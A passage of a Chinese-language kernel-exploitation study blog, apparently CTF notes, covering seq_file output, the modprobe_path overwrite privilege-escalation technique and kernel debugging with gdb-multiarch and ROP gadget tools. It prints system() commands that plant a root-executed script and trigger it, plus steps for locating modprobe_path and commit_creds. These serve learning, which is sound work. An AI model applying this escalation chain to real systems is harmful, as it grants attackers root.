tuplehash_to_ctrack(hash);</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_protocol</span> *<span class="title">proto</span>;</span></span><br><span class="line"></span><br><span class="line"> ASSERT_READ_LOCK(&amp;ip_conntrack_lock);</span><br><span class="line"> IP_NF_ASSERT(conntrack);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* we only want to print DIR_ORIGINAL */</span></span><br><span class="line"> <span class="keyword">if</span> (DIRECTION(hash))</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> proto = __ip_conntrack_proto_find(conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum);</span><br><span class="line"> IP_NF_ASSERT(proto);</span><br><span class="line"><span class="comment">// 以下打印连接和协议信息</span></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;%-8s %u %ld &quot;</span>,</span><br><span class="line">    proto-&gt;name,</span><br><span class="line">    conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum,</span><br><span class="line">    timer_pending(&amp;conntrack-&gt;timeout)</span><br><span class="line">    ? (<span class="type">long</span>)(conntrack-&gt;timeout.expires - jiffies)/HZ</span><br><span class="line">    : <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;use=%u\n&quot;</span>, <span class="type">atomic_read</span>(&amp;conntrack-&gt;ct_general.use)))</span><br><span class="line"> <span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>seq流函数的使用保证了数据能顺序输出，这也就是&#x2F;proc只读文件中使用它的最大原因吧。</p><h2 id="阅读情况：粗略了解"><a href="#阅读情况：粗略了解" class="headerlink" title="@###阅读情况：粗略了解"></a>@###阅读情况：粗略了解</h2><h1 id="modprobe-path覆写"><a href="#modprobe-path覆写" class="headerlink" title="modprobe_path覆写"></a>modprobe_path覆写</h1><h2 id="modprobe-path介绍"><a href="#modprobe-path介绍" class="headerlink" title="modprobe_path介绍"></a>modprobe_path介绍</h2><p><code>modprobe_path</code>是用于在<code>Linux</code>内核中添加可加载的内核模块，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为 <code>/sbin/modprobe</code>，可以通过如下命令来查看该值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br><span class="line">-&gt; /sbin/modprobe</span><br></pre></td></tr></table></figure><p>此外，<code>modprobe_path</code>存储在内核本身的<code>modprobe_path</code>符号中，且具有可写权限。也即普通权限即可修改该值。</p><p>而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 <code>modprobe_path</code>所指向的程序。如果我们将这个字符串指向我们自己的<code>sh</code>文件 ，并使用 <code>system</code>或 <code>execve</code> 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）do_execve()</span><br><span class="line">（<span class="number">2</span>）do_execveat_common()</span><br><span class="line">（<span class="number">3</span>）bprm_execve()</span><br><span class="line">（<span class="number">4</span>）exec_binprm()</span><br><span class="line">（<span class="number">5</span>）search_binary_handler()</span><br><span class="line">（<span class="number">6</span>）request_module()</span><br><span class="line">（<span class="number">7</span>）call_usermodehelper()</span><br></pre></td></tr></table></figure><p>那么查看 <code>__request_module</code> 源码如下，本质就是调用了 <code>call_usermodehelper</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __request_module(<span class="type">bool</span> wait, <span class="type">const</span> <span class="type">char</span> *fmt, ...) </span><br><span class="line">&#123; </span><br><span class="line">    va_list args; </span><br><span class="line">    <span class="type">char</span> module_name[MODULE_NAME_LEN]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_modprobes; </span><br><span class="line">    <span class="type">int</span> ret; </span><br><span class="line"><span class="comment">// char modprobe_path[KMOD_PATH_LEN] = &quot;/sbin/modprobe&quot;; </span></span><br><span class="line">    <span class="type">char</span> *argv[] = &#123; modprobe_path, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--&quot;</span>, module_name, <span class="literal">NULL</span> &#125;; </span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *envp[] = &#123; <span class="string">&quot;HOME=/&quot;</span>, </span><br><span class="line">                <span class="string">&quot;TERM=linux&quot;</span>, </span><br><span class="line">                <span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>, </span><br><span class="line">                <span class="literal">NULL</span> &#125;; <span class="comment">// 环境变量. </span></span><br><span class="line">    <span class="type">static</span> <span class="type">atomic_t</span> kmod_concurrent = ATOMIC_INIT(<span class="number">0</span>); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_KMOD_CONCURRENT 50    <span class="comment">/* Completely arbitrary value - KAO */</span> </span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> kmod_loop_msg; </span><br><span class="line"></span><br><span class="line">    va_start(args, fmt); </span><br><span class="line">    ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   </span><br><span class="line">    va_end(args); </span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= MODULE_NAME_LEN) </span><br><span class="line">        <span class="keyword">return</span> -ENAMETOOLONG; </span><br><span class="line">    max_modprobes = min(max_threads/<span class="number">2</span>, MAX_KMOD_CONCURRENT);    </span><br><span class="line">    <span class="type">atomic_inc</span>(&amp;kmod_concurrent); </span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;kmod_concurrent) &gt; max_modprobes) &#123; </span><br><span class="line">        <span class="comment">/* We may be blaming an innocent here, but unlikely */</span> </span><br><span class="line">        <span class="keyword">if</span> (kmod_loop_msg++ &lt; <span class="number">5</span>) </span><br><span class="line">            printk(KERN_ERR </span><br><span class="line">                   <span class="string">&quot;request_module: runaway loop modprobe %s\n&quot;</span>, </span><br><span class="line">                   module_name); </span><br><span class="line">        <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                           </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;                                         </span><br><span class="line">    &#125; </span><br><span class="line">    ret = call_usermodehelper(modprobe_path, argv, envp,        <span class="comment">// 执行用户空间的应用程序</span></span><br><span class="line">            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); </span><br><span class="line">    <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                                </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看 <code>call_usermodehelper</code>函数源码，该函数用于在内核空间中执行用户空间的程序，并且该程序具有<code>root</code>权限。这也保证了我们自己所写的 <code>sh</code>文件在被执行时，能执行具有<code>root</code>权限的功能，实现提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call_usermodehelper(<span class="type">char</span> *path, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="keyword">enum</span> umh_wait wait);</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">umh_wait</span> &#123;</span></span><br><span class="line">    UMH_NO_WAIT = <span class="number">-1</span>,       <span class="comment">/* don&#x27;t wait at all */</span></span><br><span class="line">    UMH_WAIT_EXEC = <span class="number">0</span>,      <span class="comment">/* wait for the exec, but not the process */</span></span><br><span class="line">    UMH_WAIT_PROC = <span class="number">1</span>,      <span class="comment">/* wait for the process to complete */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fl&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/fl&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//changed modprobe_path</span></span><br><span class="line">system(<span class="string">&quot;/tmp/fl&quot;</span>)</span><br></pre></td></tr></table></figure><ol><li>首先创建了一个我们自己的 sh文件 geflag.sh，用于 将 &#x2F;flag拷贝到 &#x2F;tmp&#x2F;flag下，并赋予 &#x2F;tmp&#x2F;flag为可读可写可执行权限。然后赋予 &#x2F;tmp&#x2F;getflag.sh可执行权限。</li><li>随后创建了一个错误格式头的文件 &#x2F;tmp&#x2F;fl，并赋予其可执行权限</li><li>当我们覆写了 modprobe_path为 &#x2F;tmp&#x2F;getflag.sh后，调用 system(“&#x2F;tmp&#x2F;fl”)触发错误，随后就能以root权限执行 &#x2F;tmp&#x2F;getflag.sh，完成将原本只能 root可读的flag拷贝到 &#x2F;tmp目录下，并赋予可读权限</li></ol><p>此外，我们该如何确定 <code>modprobe_path</code>符号的存储地址呢？在内核题目中，通常使用 <code>cat /proc/kallsyms</code>来获取符号地址，但是 <code>modprobe_path</code>并不在其中。这里我们可以考虑查找引用了<code>modprobe_path</code>符号的地址，来获取其地址。而在上面 <code>__request_module</code>代码中，即引用了 <code>modprobe_path</code>的地址。所以我们可以通过以下方法找到 <code>modprobe_path</code>地址：</p><ul><li>先通过 &#x2F;proc&#x2F;kallsyms找到 __request_module地址</li><li>随后查看 __reques_module函数汇编，找到 modprobe_path的引用</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/</span> <span class="comment"># cat /proc/kallsyms | grep __request     </span></span><br><span class="line"><span class="string">ffffffffbb2aad00</span> <span class="string">T</span> <span class="string">__request_module</span>         </span><br><span class="line"><span class="string">ffffffffbb1afdb8</span> <span class="string">t</span> <span class="string">__request_module.cold</span>    </span><br><span class="line"><span class="string">ffffffffba886e60</span> <span class="string">T</span> <span class="string">__request_percpu_irq</span>     </span><br><span class="line"><span class="string">ffffffffbb2baa30</span> <span class="string">T</span> <span class="string">__request_region</span>         </span><br><span class="line"><span class="string">ffffffffbaee47fc</span> <span class="string">t</span> <span class="string">__request_region.cold</span>    </span><br><span class="line"><span class="string">ffffffffba8aa2b0</span> <span class="string">t</span> <span class="string">__request_resource</span>       </span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/28i</span> <span class="number">0xffffffffbb2aad00</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad00:</span>  <span class="string">push</span>   <span class="string">rbp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad01:</span>  <span class="string">mov</span>    <span class="string">rbp,rsp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad04:</span>  <span class="string">push</span>   <span class="string">r14</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad06:</span>  <span class="string">push</span>   <span class="string">r13</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad08:</span>  <span class="string">push</span>   <span class="string">r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0a:</span>  <span class="string">mov</span>    <span class="string">r12,rsi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0d:</span>  <span class="string">push</span>   <span class="string">r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0f:</span>  <span class="string">lea</span>    <span class="string">r10,[rbp+0x10]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad13:</span>  <span class="string">push</span>   <span class="string">rbx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad14:</span>  <span class="string">mov</span>    <span class="string">r13,r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad17:</span>  <span class="string">mov</span>    <span class="string">ebx,edi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad19:</span>  <span class="string">sub</span>    <span class="string">rsp,0xb0</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad20:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x48</span>]<span class="string">,rdx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad24:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x40</span>]<span class="string">,rcx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad28:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x38</span>]<span class="string">,r8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad2c:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x30</span>]<span class="string">,r9</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad30:</span>  <span class="string">mov</span>    <span class="string">rax,QWORD</span> <span class="string">PTR</span> <span class="string">gs:0x28</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad39:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x60</span>]<span class="string">,rax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3d:</span>  <span class="string">xor</span>    <span class="string">eax,eax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3f:</span>  <span class="string">test</span>   <span class="string">dil,dil</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad42:</span>  <span class="string">jne</span>    <span class="number">0xffffffffbb2aaec8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad48:</span>  <span class="string">cmp</span>    <span class="string">BYTE</span> <span class="string">PTR</span> [<span class="string">rip+0x59d711</span>]<span class="string">,0x0</span>        <span class="comment"># 0xffffffffbb848460</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad4f:</span>  <span class="string">je</span>     <span class="number">0xffffffffbb2ab024</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad55:</span>  <span class="string">lea</span>    <span class="string">rax,[rbp-0x58]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad59:</span>  <span class="string">lea</span>    <span class="string">rcx,[rbp-0xb0]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad60:</span>  <span class="string">mov</span>    <span class="string">rdx,r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad63:</span>  <span class="string">mov</span>    <span class="string">esi,0x38</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad68:</span>  <span class="string">lea</span>    <span class="string">rdi,[rbp-0x98]</span></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/s</span> <span class="number">0xffffffffbb848460</span></span><br><span class="line"><span class="attr">0xffffffffbb848460:</span>     <span class="string">&quot;/sbin/modprobe&quot;</span></span><br></pre></td></tr></table></figure><p>那么，总结一下该 技术的使用条件：</p><ul><li>知道 modprobe_path地址</li><li>拥有一个任意地址写漏洞，用于修改 modprobe_path内容</li></ul><h2 id="阅读情况：大致了解"><a href="#阅读情况：大致了解" class="headerlink" title="@###阅读情况：大致了解"></a>@###阅读情况：大致了解</h2><h1 id="内核调试命令"><a href="#内核调试命令" class="headerlink" title="内核调试命令"></a>内核调试命令</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo  <span class="comment"># 查看所开保护</span></span><br><span class="line"><span class="built_in">cat</span> /proc/slabinfo  <span class="comment"># 查看内核堆块</span></span><br></pre></td></tr></table></figure><h2 id="获取-ROP-地址"><a href="#获取-ROP-地址" class="headerlink" title="获取 ROP 地址"></a>获取 ROP 地址</h2><p>这块有时 ROPgadget 快，有时 ropper 快，随缘吧</p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>使用方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; _gadget.txt</span><br></pre></td></tr></table></figure><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>使用方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --no-color -f ./vmlinux &gt; gadget.txt</span><br></pre></td></tr></table></figure><h2 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsmod  <span class="comment"># 查看装载驱动，也是获得内核文件加载的基地址</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure><p>此处若是开了地址随机化，需要先改启动脚本，使 kaslr 变成 nokaslr，然后获取一个栈地址，将其记录</p><p>之后再把 nokaslr 改回 kaslr，运行脚本获得之前所记录地址处对应的新地址，做差，记录这个差值为 stackbase</p><p>之后把获得的所有的内核地址都加上这个 stackbase，即差值，才能获得在开启 kaslr 下的真实地址</p><h1 id="gdb-multiarch-调试命令"><a href="#gdb-multiarch-调试命令" class="headerlink" title="gdb-multiarch 调试命令"></a>gdb-multiarch 调试命令</h1><p>一般来说用 gdb 就可以，跨平台的话就要用 gdb-multiarch</p><h2 id="设置架构"><a href="#设置架构" class="headerlink" title="设置架构"></a>设置架构</h2><p>在 startvm.sh 脚本上设置好端口后就可以用 gdb-multiarch 来调试了</p><p>首先要根据使用的 qemu 来设置系统架构，设置命令为<code>set architecture 内核系统架构</code></p><p>架构有很多，我用的是 qemu 3.0.0，是在 Ubuntu 16.04 下自行编译安装的，因为默认版本很老</p><p>不过 Ubuntu 18.04 之后的 qemu 都是 3.0.0 以后的版本，所以按需搭配自己喜欢的环境就好</p><p>架构一览：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">aarch64                        mips:4400</span><br><span class="line">aarch64:ilp32                  mips:4600</span><br><span class="line">alpha                          mips:4650</span><br><span class="line">alpha:ev4                      mips:5000</span><br><span class="line">alpha:ev5                      mips:5400</span><br><span class="line">alpha:ev6                      mips:5500</span><br><span class="line">arm                            mips:5900</span><br><span class="line">armv2                          mips:6000</span><br><span class="line">armv2a                         mips:7000</span><br><span class="line">armv3                          mips:8000</span><br><span class="line">armv3m                         mips:9000</span><br><span class="line">armv4                          mips:isa32</span><br><span class="line">armv4t                         mips:isa32r2</span><br><span class="line">armv5                          mips:isa32r3</span><br><span class="line">armv5t                         mips:isa32r5</span><br><span class="line">armv5te                        mips:isa32r6</span><br><span class="line">auto                           mips:isa64</span><br><span class="line">ep9312                         mips:isa64r2</span><br><span class="line">hppa1.0                        mips:isa64r3</span><br><span class="line">i386                           mips:isa64r5</span><br><span class="line">i386:intel                     mips:isa64r6</span><br><span class="line">i386:nacl                      mips:loongson_2e</span><br><span class="line">i386:x64-32                    mips:loongson_2f</span><br><span class="line">i386:x64-32:intel              mips:loongson_3a</span><br><span class="line">i386:x64-32:nacl               mips:micromips</span><br><span class="line">i386:x86-64                    mips:mips5</span><br><span class="line">i386:x86-64:intel              mips:octeon</span><br><span class="line">i386:x86-64:nacl               mips:octeon+</span><br><span class="line">i8086                          mips:octeon2</span><br><span class="line">ia64-elf32                     mips:octeon3</span><br><span class="line">ia64-elf64                     mips:sb1</span><br><span class="line">iwmmxt                         mips:xlr</span><br><span class="line">iwmmxt2                        powerpc:403</span><br><span class="line">m32r                           powerpc:601</span><br><span class="line">m32r2                          powerpc:603</span><br><span class="line">m32rx                          powerpc:604</span><br><span class="line">m68k                           powerpc:620</span><br><span class="line">m68k:5200                      powerpc:630</span><br><span class="line">m68k:5206e                     powerpc:7400</span><br><span class="line">m68k:521x                      powerpc:750</span><br><span class="line">m68k:5249                      powerpc:EC603e</span><br><span class="line">m68k:528x                      powerpc:MPC8XX</span><br><span class="line">m68k:5307                      powerpc:a35</span><br><span class="line">m68k:5407                      powerpc:common</span><br><span class="line">m68k:547x                      powerpc:common64</span><br><span class="line">m68k:548x                      powerpc:e500</span><br><span class="line">m68k:68000                     powerpc:e500mc</span><br><span class="line">m68k:68008                     powerpc:e500mc64</span><br><span class="line">m68k:68010                     powerpc:e5500</span><br><span class="line">m68k:68020                     powerpc:e6500</span><br><span class="line">m68k:68030                     powerpc:rs64ii</span><br><span class="line">m68k:68040                     powerpc:rs64iii</span><br><span class="line">m68k:68060                     powerpc:titan</span><br><span class="line">m68k:cfv4e                     powerpc:vle</span><br><span class="line">m68k:cpu32                     rs6000:6000</span><br><span class="line">m68k:fido                      rs6000:rs1</span><br><span class="line">m68k:isa-a                     rs6000:rs2</span><br><span class="line">m68k:isa-a:emac                rs6000:rsc</span><br><span class="line">m68k:isa-a:mac                 s390:31-bit</span><br><span class="line">m68k:isa-a:nodiv               s390:64-bit</span><br><span class="line">m68k:isa-aplus                 sh</span><br><span class="line">m68k:isa-aplus:emac            sh-dsp</span><br><span class="line">m68k:isa-aplus:mac             sh2</span><br><span class="line">m68k:isa-b                     sh2a</span><br><span class="line">m68k:isa-b:emac                sh2a-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>               sh2a-nofpu-or-sh3-nommu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:emac          sh2a-nofpu-or-sh4-nommu-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:mac           sh2a-or-sh3e</span><br><span class="line">m68k:isa-b:mac                 sh2a-or-sh4</span><br><span class="line">m68k:isa-b:nousp               sh2e</span><br><span class="line">m68k:isa-b:nousp:emac          sh3</span><br><span class="line">m68k:isa-b:nousp:mac           sh3-dsp</span><br><span class="line">m68k:isa-c                     sh3-nommu</span><br><span class="line">m68k:isa-c:emac                sh3e</span><br><span class="line">m68k:isa-c:mac                 sh4</span><br><span class="line">m68k:isa-c:nodiv               sh4-nofpu</span><br><span class="line">m68k:isa-c:nodiv:emac          sh4-nommu-nofpu</span><br><span class="line">m68k:isa-c:nodiv:mac           sh4a</span><br><span class="line">mips                           sh4a-nofpu</span><br><span class="line">mips:10000                     sh4al-dsp</span><br><span class="line">mips:12000                     sh5</span><br><span class="line">mips:14000                     sparc</span><br><span class="line">mips:16                        sparc:sparclet</span><br><span class="line">mips:16000                     sparc:sparclite</span><br><span class="line">mips:3000                      sparc:sparclite_le</span><br><span class="line">mips:3900                      sparc:v8plus</span><br><span class="line">mips:4000                      sparc:v8plusa</span><br><span class="line">mips:4010                      sparc:v8plusb</span><br><span class="line">mips:4100                      sparc:v9</span><br><span class="line">mips:4111                      sparc:v9a</span><br><span class="line">mips:4120                      sparc:v9b</span><br><span class="line">mips:4300                      xscale</span><br></pre></td></tr></table></figure><p>假使 startvm.sh 上面所写的 qemu 种类是 qemu-system-x86_64</p><p>那么就用 i386:x86-64 架构，输入命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br></pre></td></tr></table></figure><h2 id="连接端口"><a href="#连接端口" class="headerlink" title="连接端口"></a>连接端口</h2><p>命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><h2 id="读取内核文件符号表及内核加载基地址"><a href="#读取内核文件符号表及内核加载基地址" class="headerlink" title="读取内核文件符号表及内核加载基地址"></a>读取内核文件符号表及内核加载基地址</h2><p>先用 extract-vmlinux 命令提取 vmlinux 文件，命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p>然后先用 root 用户登录，在里面输入 lsmod 获得模块加载的基地址：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># $ lsmod</span></span><br><span class="line">baby 16384 1 - Live 0xffffffffc0000000 (POE)</span><br></pre></td></tr></table></figure><p>之后启动的时候这么启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./vmlinux -ex <span class="string">&quot;set architecture i386:x86-64&quot;</span> -ex <span class="string">&quot;add-symbol-file ./baby.ko 0xffffffffc0000000&quot;</span> -ex <span class="string">&quot;target remote localhost:2222&quot;</span></span><br></pre></td></tr></table></figure><h1 id="eth0-1"><a href="#eth0-1" class="headerlink" title="eth0&#x2F;1"></a>eth0&#x2F;1</h1><p>eth0 eth0:1 